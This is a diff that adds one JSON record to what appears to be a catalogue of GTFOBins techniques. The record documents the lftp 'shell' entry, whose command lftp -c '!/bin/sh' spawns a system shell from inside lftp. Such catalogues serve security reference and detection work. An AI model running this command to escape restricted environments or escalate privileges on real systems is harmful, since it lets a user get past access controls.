@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-lftp-shell",
+  "name": "GTFOBins · lftp (shell)",
+  "command": "lftp -c '!/bin/sh'",
+  "description": "Use lftp to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "lftp",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/lftp/#shell",
+  "upstream_id": "lftp/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/lftp/"
+    }
+  ]
+}
